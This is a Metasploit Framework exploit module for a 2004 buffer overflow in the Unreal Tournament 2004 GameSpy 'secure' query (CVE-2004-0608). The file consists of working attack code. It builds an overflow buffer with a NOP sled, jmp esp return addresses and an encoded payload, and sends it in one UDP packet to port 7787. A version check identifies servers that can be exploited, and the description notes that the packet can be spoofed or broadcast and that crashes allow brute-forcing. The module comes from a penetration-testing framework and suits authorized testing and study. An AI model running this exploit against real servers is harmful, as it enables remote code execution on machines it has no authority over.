##
# $Id: ut2004_secure.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Unreal Tournament 2004 "secure" Overflow (Win32)',
			'Description'    => %q{

			This is an exploit for the GameSpy secure query in
			the Unreal Engine.

			This exploit only requires one UDP packet, which can
			be both spoofed and sent to a broadcast address.
			Usually, the GameSpy query server listens on port 7787,
			but you can manually specify the port as well.

			The RunServer.sh script will automatically restart the
			server upon a crash, giving us the ability to
			bruteforce the service and exploit it multiple
			times.

			},
			'Author'         => [ 'stinko' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'CVE', '2004-0608'],
					[ 'OSVDB', '7217'],
					[ 'BID', '10570'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x5c\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['UT2004 Build 3186', { 'Rets' => [ 0x10184be3, 0x7ffdf0e4 ] }], # jmp esp
				],
			'DisclosureDate' => 'Jun 18 2004',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(7787)
			], self.class)

	end

	def exploit
		connect_udp

		buf = make_nops(1024)
		buf[0, 60] = [target['Rets'][0]].pack('V') * 15
		buf[54, 4] = [target['Rets'][1]].pack('V')
		buf[0,  8] = "\\secure\\"
		buf[buf.length - payload.encoded.length, payload.encoded.length] = payload.encoded

		udp_sock.put(buf)

		handler
		disconnect_udp
	end

	def ut_version
		connect_udp
		udp_sock.put("\\basic\\")
		res = udp_sock.recvfrom(8192)
		disconnect_udp

		if (res and (m=res.match(/\\gamever\\([0-9]{1,5})/)))
			return m[1]
		end

		return
	end

	def check
		vers = ut_version

		if (not vers)
			print_status("Could not detect Unreal Tournament Server")
			return
		end

		print_status("Detected Unreal Tournament Server Version: #{vers}")
		if (vers =~ /^(3120|3186|3204)$/)
			print_status("This system appears to be exploitable")
			return Exploit::CheckCode::Appears
		end


		if (vers =~ /^(2...)$/)
			print_status("This system appears to be running UT2003")
			return Exploit::CheckCode::Detected
		end

		print_status("This system appears to be patched")
		return Exploit::CheckCode::Safe
	end

end
